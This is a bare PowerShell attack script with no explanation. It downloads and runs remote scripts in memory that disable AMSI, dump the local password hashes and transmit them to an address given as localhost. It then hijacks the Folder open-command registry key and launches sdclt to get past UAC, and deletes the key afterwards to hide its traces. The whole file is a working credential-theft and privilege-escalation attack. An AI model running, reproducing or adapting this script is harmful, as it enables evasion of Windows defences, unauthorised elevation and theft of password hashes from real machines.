$program = "powershell -windowstyle hidden IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1');IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1');IEX " + "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1');Get-PassHashes | Out-String | Invoke-Transmission -ip localhost"
New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $program
New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process cmd /c start sdclt
Sleep 2
Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force